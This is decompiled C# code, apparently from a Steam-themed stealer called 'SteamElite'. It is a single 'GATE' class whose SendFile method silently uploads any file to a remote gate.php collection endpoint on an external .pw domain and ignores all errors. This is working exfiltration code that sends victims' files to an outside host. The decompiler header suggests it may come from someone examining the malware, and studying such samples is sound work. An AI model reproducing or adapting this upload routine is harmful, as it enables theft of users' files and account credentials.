// Decompiled with JetBrains decompiler
// Type: GATE
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System.Net;

internal class GATE
{
  private WebClient oWeb = new WebClient();

  public void SendFile(string FileName)
  {
    try
    {
      this.oWeb.UploadFile("https://bebravebaby.pw/files/elite/gate.php", FileName);
    }
    catch
    {
    }
  }
}
